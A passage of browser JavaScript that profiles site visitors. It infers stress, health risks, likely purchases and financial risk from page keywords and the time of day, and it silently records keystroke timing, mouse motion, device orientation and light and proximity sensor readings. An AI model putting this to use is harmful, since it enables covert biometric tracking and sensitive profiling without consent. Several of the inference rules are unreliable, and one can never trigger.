  const primary = ipData.primary || ipData.secondary || ipData.tertiary
  if (!primary) return 'Unknown'
  
  const browserTz = Intl.DateTimeFormat().resolvedOptions().timeZone
  const ipLocation = primary.timezone || primary.region
  
  if (detectVPN(ipData)) return 'Masked'
  if (browserTz.includes(primary.country_code || '')) return 'Stable'
  return 'Mobile'
}

const isLocationMasked = (ipData) => {
  return detectVPN(ipData) || getISPType(ipData) === 'Mobile'
}

const assessNetworkSecurity = (ipData) => {
  if (!ipData) return 'Unknown'
  let score = 0
  
  if (detectVPN(ipData)) score += 3
  if (location.protocol === 'https:') score += 2
  if (navigator.doNotTrack === '1') score += 1
  if (isPremiumISP(ipData)) score += 1
  
  if (score >= 5) return 'High'
  if (score >= 3) return 'Medium'
  return 'Low'
}

const analyzeWorkLifeBalance = () => {
  const hour = new Date().getHours()
  const lateNight = hour >= 23 || hour <= 5
  const sleep = hour >= 22 || hour <= 6
  
  if (lateNight && !sleep) return 'Poor'
  if (!lateNight && sleep) return 'Good'
  return 'Average'
}

const calculateStressLevel = () => {
  const hour = new Date().getHours()
  const textContent = document.body.innerText.toLowerCase()
  const indicators = [
    hour >= 23 || hour <= 5,
    /stress|urgent|deadline/.test(textContent),
    !(hour >= 22 || hour <= 6)
  ].filter(Boolean).length
  
  return indicators >= 2 ? 'High' : indicators === 1 ? 'Medium' : 'Low'
}

const assessHealthRisk = () => {
  let risk = 0
  const hour = new Date().getHours()
  const textContent = document.body.innerText.toLowerCase()
  
  if (hour >= 23 || hour <= 5) risk += 2
  if (!/health|fitness|workout/.test(textContent)) risk += 1
  if (/stress|urgent|deadline/.test(textContent)) risk += 1
  
  return risk >= 3 ? 'High' : risk >= 2 ? 'Medium' : 'Low'
}

const getPredictiveProfile = (ipData) => {
  return {
    likelyPurchases: predictPurchases(ipData),
    healthTrends: predictHealthTrends(),
    riskFactors: identifyRiskFactors(ipData)
  }
}

const predictPurchases = (ipData) => {
  const predictions = []
  const textContent = document.body.innerText.toLowerCase()
  
  if (/crypto|bitcoin|invest/.test(textContent)) {
    predictions.push('Cryptocurrency', 'Investment apps')
  }
  
  if (/health|fitness|workout/.test(textContent)) {
    predictions.push('Fitness equipment', 'Health supplements')
  }
  
  if ((navigator.deviceMemory || 4) >= 8) {
    predictions.push('Premium software', 'Latest gadgets')
  }
  
  if (detectVPN(ipData)) {
    predictions.push('Privacy tools', 'Security software')
  }
  
  if (isPremiumISP(ipData)) {
    predictions.push('Streaming services', 'Cloud storage')
  }
  
  return predictions
}

const predictHealthTrends = () => {
  const trends = []
  const hour = new Date().getHours()
  const textContent = document.body.innerText.toLowerCase()
  
  if (hour >= 23 || hour <= 5) {
    trends.push('Sleep disorders', 'Stress-related issues')
  }
  
  if (!/health|fitness|workout/.test(textContent)) {
    trends.push('Sedentary lifestyle', 'Weight gain risk')
  }
  
  return trends
}

const identifyRiskFactors = (ipData) => {
  const risks = []
  const textContent = document.body.innerText.toLowerCase()
  
  if (/crypto|bitcoin|invest/.test(textContent)) {
    risks.push('Financial speculation risk')
  }
  
  if (new Date().getHours() >= 23 || new Date().getHours() <= 5) {
    risks.push('Mental health deterioration')
  }
  
  if (navigator.doNotTrack !== '1' && !detectVPN(ipData)) {
    risks.push('Privacy vulnerability')
  }
  
  if (!detectVPN(ipData) && getISPType(ipData) === 'Mobile') {
    risks.push('Location tracking risk')
  }
  
  if (assessNetworkSecurity(ipData) === 'Low') {
    risks.push('Network security risk')
  }
  
  return risks
}

const getRiskAssessment = (ipData) => {
  return {
    financialRisk: assessFinancialRisk(),
    privacyRisk: assessPrivacyRisk(ipData),
    networkRisk: assessNetworkRisk(ipData),
    overallRisk: calculateOverallRisk(ipData)
  }
}

const assessFinancialRisk = () => {
  let risk = 0
  const textContent = document.body.innerText.toLowerCase()
  if (/crypto|bitcoin|invest/.test(textContent)) risk += 2
  if ((navigator.deviceMemory || 4) <= 2) risk += 1
  
  return risk >= 3 ? 'High' : risk >= 2 ? 'Medium' : 'Low'
}

const assessPrivacyRisk = (ipData) => {
  let risk = 0
  if (navigator.doNotTrack !== '1') risk += 2
  if (/tech|software|code/.test(document.body.innerText.toLowerCase())) risk += 1
  if (!detectVPN(ipData)) risk += 2
  if (getISPType(ipData) === 'Mobile') risk += 1
  
  return risk >= 4 ? 'High' : risk >= 2 ? 'Medium' : 'Low'
}

const assessNetworkRisk = (ipData) => {
  let risk = 0
  if (!detectVPN(ipData)) risk += 1
  if (location.protocol !== 'https:') risk += 2
  if (!isPremiumISP(ipData)) risk += 1
  
  return risk >= 3 ? 'High' : risk >= 2 ? 'Medium' : 'Low'
}

const calculateOverallRisk = (ipData) => {
  const risks = [
    assessFinancialRisk(),
    assessHealthRisk(),
    assessPrivacyRisk(ipData),
    assessNetworkRisk(ipData)
  ]
  
  const highRisks = risks.filter(r => r === 'High').length
  const mediumRisks = risks.filter(r => r === 'Medium').length
  
  if (highRisks >= 2) return 'High'
  if (highRisks >= 1 || mediumRisks >= 3) return 'Medium'
  return 'Low'
}

const getEyeTracking = () => {
  const data = { gazePoints: [], fixations: [] }
  
  document.addEventListener('mousemove', (e) => {
    // Approximate gaze tracking using mouse position
    data.gazePoints.push({
      x: e.clientX / window.innerWidth,
      y: e.clientY / window.innerHeight,
      timestamp: Date.now()
    })
    if (data.gazePoints.length > 50) data.gazePoints.shift()
  })
  
  return data
}

const getKeystrokeDynamics = () => {
  const data = { dwellTimes: [], flightTimes: [] }
  let keyDownTime = {}
  let lastKeyUp = 0
  
  document.addEventListener('keydown', (e) => {
    keyDownTime[e.code] = Date.now()
  })
  
  document.addEventListener('keyup', (e) => {
    const now = Date.now()
    if (keyDownTime[e.code]) {
      data.dwellTimes.push(now - keyDownTime[e.code])
      delete keyDownTime[e.code]
    }
    if (lastKeyUp > 0) {
      data.flightTimes.push(now - lastKeyUp)
    }
    lastKeyUp = now
    
    if (data.dwellTimes.length > 100) data.dwellTimes.shift()
    if (data.flightTimes.length > 100) data.flightTimes.shift()
  })
  
  return data
}

const getMouseGestures = () => {
  const data = { gestures: [], velocity: [], acceleration: [] }
  let lastPos = { x: 0, y: 0, time: Date.now() }
  let lastVel = { x: 0, y: 0 }
  
  document.addEventListener('mousemove', (e) => {
    const now = Date.now()
    const dt = now - lastPos.time
    
    if (dt > 0) {
      const vel = {
        x: (e.clientX - lastPos.x) / dt,
        y: (e.clientY - lastPos.y) / dt
      }
      
      const acc = {
        x: (vel.x - lastVel.x) / dt,
        y: (vel.y - lastVel.y) / dt
      }
      
      data.velocity.push(Math.sqrt(vel.x * vel.x + vel.y * vel.y))
      data.acceleration.push(Math.sqrt(acc.x * acc.x + acc.y * acc.y))
      
      if (data.velocity.length > 100) data.velocity.shift()
      if (data.acceleration.length > 100) data.acceleration.shift()
      
      lastPos = { x: e.clientX, y: e.clientY, time: now }
      lastVel = vel
    }
  })
  
  return data
}

const getDeviceOrientation = () => {
  const data = { orientations: [] }
  
  if ('DeviceOrientationEvent' in window) {
    window.addEventListener('deviceorientation', (e) => {
      data.orientations.push({
        alpha: e.alpha,
        beta: e.beta,
        gamma: e.gamma,
        timestamp: Date.now()
      })
      if (data.orientations.length > 50) data.orientations.shift()
    })
  }
  
  return data
}

const getAmbientLight = () => {
  const data = { readings: [] }
  
  if ('AmbientLightSensor' in window) {
    try {
      const sensor = new AmbientLightSensor()
      sensor.addEventListener('reading', () => {
        data.readings.push({
          illuminance: sensor.illuminance,
          timestamp: Date.now()
        })
        if (data.readings.length > 20) data.readings.shift()
      })
      sensor.start()
    } catch (e) {}
  }
  
  return data
}

const getProximityData = () => {
  const data = { readings: [] }
  
  if ('ProximitySensor' in window) {
    try {
      const sensor = new ProximitySensor()
      sensor.addEventListener('reading', () => {
        data.readings.push({
          distance: sensor.distance,
          max: sensor.max,
          near: sensor.near,
          timestamp: Date.now()
        })
        if (data.readings.length > 20) data.readings.shift()
      })
      sensor.start()
    } catch (e) {}
  }
  
  return data
}